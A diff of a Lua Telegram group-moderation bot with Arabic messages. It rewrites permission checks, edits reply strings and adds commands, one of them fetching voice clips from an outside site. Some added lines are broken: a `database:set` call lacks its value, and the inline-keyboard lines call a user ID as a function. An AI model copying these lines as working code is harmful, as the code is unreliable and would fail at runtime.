+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13231,7 +13193,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13250,12 +13212,12 @@ local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
 local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
 local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
 ------------------------------------------------------------------------
-if text and text:match("^قول (.*)$") then
+if text and text:match("^قول (.*)$") and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
 local Textxt = text:match("^قول (.*)$")
 send(msg.chat_id_, msg.id_, '['..Textxt..']')
 end
 if text == "راسلني" then
-rpl = {"ها هلاو","انطق","قول","نعم"};
+rpl = {"اي","انطق","قول","نعم","عندكو شامبو","الكوسه بكام"};
 sender = rpl[math.random(#rpl)]
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
@@ -13281,7 +13243,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
+if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
@@ -13414,13 +13380,17 @@ send(msg.chat_id_, msg.id_,ramsesj20)
 end
 
 
-if text == ("الردود المتعدده") and CoSu(msg) then
+if text == ("الردود المتعدده") then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13435,26 +13405,34 @@ text = "لا توجد ردود متعدده"
 end
 send(msg.chat_id_, msg.id_,"["..text.."]")
 end
-if text == "اضف رد متعدد" and CoSu(msg) then
+if text == "اضف رد متعدد" then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
 database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_,"☉┇ارسل الرد الذي اريد اضافته")
 end
-if text == "مسح رد متعدد" and CoSu(msg) then
+if text == "مسح رد متعدد" then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13557,7 +13535,7 @@ end
 end
 
 -------------------------------
-if text == ""..(database:get(bot_id..'Name:Bot') or 'باور').." غادر" or text == 'بوت غادر' then  
+if text == ""..(database:get(bot_id..'Name:Bot') or 'باور').."غادر" or text == 'بوت غادر' then  
 if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
 send(msg.chat_id_, msg.id_,' ☉┇ تم مغادرة الجروب') 
@@ -13566,7 +13544,10 @@ end
 return false  
 end
 if text == 'الاحصائيات' then
-if Sudo(msg) then 
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end   
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = ' الاحصائيات ☉ \n'..' ☉┇ عدد الجروبات » {`'..Groups..'`}'..'\n ☉┇  عدد المشتركين » {`'..Users..'`}'
@@ -13575,7 +13556,10 @@ end
 return false
 end
 if text == 'الجروبات' then
-if Sudo(msg) then 
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end   
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = ' ☉┇ عدد الجروبات » {`'..Groups..'`}'
@@ -13584,7 +13568,10 @@ end
 return false
 end
 if text == 'المشتركين' then
-if Sudo(msg) then 
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end   
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = ' ☉┇ عدد المشتركين » {`'..Users..'`}'
@@ -13723,7 +13710,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الايدي بالصوره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الحظر' and Constructor(msg) then   
+if text == 'تفعيل الحظر' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
 database:del(bot_id..'Lock:kick'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الحظر' 
@@ -13732,7 +13723,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الحظر'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الحظر' and Constructor(msg) then  
+if text == 'تعطيل الحظر' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
 database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الحظر' 
@@ -13741,7 +13736,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الحظر'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الرفع' and Constructor(msg) then   
+if text == 'تفعيل الرفع' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
 database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الرفع' 
@@ -13750,7 +13749,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الرفع'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الرفع' and Constructor(msg) then  
+if text == 'تعطيل الرفع' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
 database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الرفع' 
@@ -13781,7 +13784,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13827,7 +13830,7 @@ send(msg.chat_id_, msg.id_,first_name..'\n'..last_name)
 end,nil)
 end 
 if text == 'ايديي' then
-send(msg.chat_id_, msg.id_,' ☉┇ ايديك » '..msg.sender_user_id_)
+send(msg.chat_id_, msg.id_,' ☉┇ ايديك » `'..msg.sender_user_id_..'`')
 end
 if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
 function start_function(extra, result, success)
@@ -13863,7 +13866,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extr
 local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.sender_user_id_
-send(msg.chat_id_, msg.id_,' ☉┇ الايدي » ('..iduser..')\n ☉┇ المعرف » ('..username..')\n ☉┇ الرتبه » ('..rtp..')\n ☉┇ نوع الكشف » بالرد')
+send(msg.chat_id_, msg.id_,' ☉┇ الايدي » ('..iduser..')\n ☉┇ المعرف » ('..username..')\n ☉┇ الرتبه » ('..rtp..')\n ☉┇ نوع الكشف » بالرد\n ☉┇ ثمن الكشف » مجاني')
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -13877,7 +13880,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data)
 local rtp = Rutba(result.id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.id_
-send(msg.chat_id_, msg.id_,' ☉┇ الايدي » ('..iduser..')\n ☉┇ المعرف » ('..username..')\n ☉┇ الرتبه » ('..rtp..')\n ☉┇ نوع الكشف » بالمعرف')
+send(msg.chat_id_, msg.id_,' ☉┇ الايدي » ('..iduser..')\n ☉┇ المعرف » ('..username..')\n ☉┇ الرتبه » ('..rtp..')\n ☉┇ نوع الكشف » بالمعرف\n ☉┇ ثمن الكشف » مجاني')
 end,nil)
 else
 send(msg.chat_id_, msg.id_,' ☉┇ المعرف غير صحيح')
@@ -13900,7 +13903,7 @@ local sofi = ' ☉┇ عدد الادمنيه : '..data.administrator_count_..
 '\n\n ☉┇ عدد المطرودين : '..data.kicked_count_..
 '\n\n ☉┇ عدد الاعضاء : '..data.member_count_..
 '\n\n ☉┇ عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
-'\n\n ☉┇  اسم الجروب : ['..ta.title_..']'
+'\n\n ☉┇ اسم الجروب : ['..ta.title_..']'
 send(msg.chat_id_, msg.id_, sofi) 
 end,nil)
 end,nil)
@@ -14028,7 +14031,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر صيح'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تنزيل جميع الرتب' and BasicConstructor(msg) then  
+if text == 'تنزيل جميع الرتب' then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end  
 database:del(bot_id..'Constructor'..msg.chat_id_)
 database:del(bot_id..'Manager'..msg.chat_id_)
 database:del(bot_id..'Mod:User'..msg.chat_id_)
@@ -15311,7 +15318,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15427,14 +15434,14 @@ end
 if text == 'سحكاتي' or text == 'تعديلاتي' then 
 local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
 if Num == 0 then 
-Text = ' ☉┇  ليس لديك سحكات'
+Text = ' ☉┇  ليس لديك تعديلات'
 else
-Text = ' ☉┇ عدد سحكاتك *» { '..Num..' } *'
+Text = ' ☉┇ عدد تعديلاتك *» { '..Num..' } *'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
-send(msg.chat_id_, msg.id_,' ☉┇ تم مسح سحكاتك'  )  
+if text == "مسح تعديلاني" or text == "مسح سحكاتي" then  
+send(msg.chat_id_, msg.id_,' ☉┇ تم مسح تعديلاتك'  )  
 database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
 end
 if text == "مسح جهاتي" or text == "مسح جهاتي" then  
@@ -15447,7 +15454,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15459,7 +15466,7 @@ Text = ' ☉┇ عدد جهاتك *» { '..Num..' } *'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == " " then
+if text == "مسح المشتركين" then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
@@ -15642,7 +15649,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15661,7 +15668,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15711,6 +15718,16 @@ end
 end
 
 
+if text and text:match("^تغير رد المطور الاساسي (.*)$") and Manager2(msg) then
+local Teext = text:match("^تغير رد المطور الاساسي (.*)$") 
+database:set(bot_id.."SudoBot"..msg.chat_id_)
+send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المطور الاساسي الى » "..Teext)
+end
+if text and text:match("^تغير رد المطور الثاني (.*)$") and Manager2(msg) then
+local Teext = text:match("^تغير رد المطور الثاني (.*)$") 
+database:set(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المطور الثاني الى » "..Teext)
+end
 if text and text:match("^تغير رد المطور (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد المطور (.*)$") 
 database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
@@ -15731,10 +15748,25 @@ local Teext = text:match("^تغير رد المنشئ (.*)$")
 database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
 send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المنشئ الى » "..Teext)
 end
+if text and text:match("^تغير رد المدير العام (.*)$") and Manager2(msg) then
+local Teext = text:match("^تغير رد المدير العام (.*)$") 
+database:set(bot_id.."Gmanager:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير العام الى » "..Teext)
+end
 if text and text:match("^تغير رد المدير (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد المدير (.*)$") 
 database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
 send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير الى » "..Teext)
+end
+if text and text:match("^تغير رد المدير الثاني (.*)$") and Manager2(msg) then
+local Teext = text:match("^تغير رد المدير الثاني (.*)$") 
+database:set(bot_id.."S00F4:MN:TF:Rd"..msg.chat_id_,Teext) 
+send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير الثاني الى » "..Teext)
+end
+if text and text:match("^تغير رد الادمن العام (.*)$") and Manager2(msg) then
+local Teext = text:match("^تغير رد الادمن العام (.*)$") 
+database:set(bot_id.."Gmod:Rd"..msg.chat_id_,Teext)
+send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد الادمن العام الى » "..Teext)
 end
 if text and text:match("^تغير رد الادمن (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد الادمن (.*)$") 
@@ -15763,7 +15795,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15774,18 +15806,10 @@ local Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data=msg.sender_user_id_ "/help3"},{text = '❷❷', callback_data=msg.sender_user_id_ "/help4"}},
+{{text = '❸❸', callback_data=msg.sender_user_id_ "/help5"},{text = '❹❹', callback_data=msg.sender_user_id_ "/help6"}},
+{{text = 'اوامر التسليه', callback_data=msg.sender_user_id_"/help7"}},
+{{text = 'قفل و القفل', callback_data=msg.sender_user_id_"/help1"},{text = 'تعطيل و تفعيل', callback_data=msg.sender_user_id_"/help2"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -15802,7 +15826,7 @@ local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم الت
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15843,7 +15867,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -15859,6 +15883,21 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
+end
+if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
+if res == 200 then
+audios = json:decode(data)
+if audios.Info == true then
+local Text ='☉┇ تم اختيار المقطع الصوتي لك'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'مقطع اخر.',callback_data="/voice1"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+end
 end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
 if database:get(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
@@ -15884,10 +15923,6 @@ database:setex(bot_id.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,tr
 send(msg.chat_id_, msg.id_, '☉┇ ارسل لي الكلمه لزخرفتها ')
 end
 if text == "تعطيل الزخرفه" then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
 return false
@@ -16158,18 +16193,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16217,18 +16244,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16287,18 +16306,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16390,18 +16401,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"}},
+{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
+{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16445,8 +16448,8 @@ local Teext =[[
 ☉┇ الغاء العام
 ☉┇ قائمه الحظر العام
 ☉┇ مسح قائمه الحظر العام
-☉┇ جلب نسخه الاحتياطيه
-☉┇ رفع نسخه الاحتياطيه
+☉┇ جلب الجروبات
+☉┇ رفع الجروبات
 •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•
 ☉┇ اذاعه خاص
 ☉┇ اذاعه
@@ -16483,18 +16486,10 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{
-{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
+{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
+{{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help7"}},
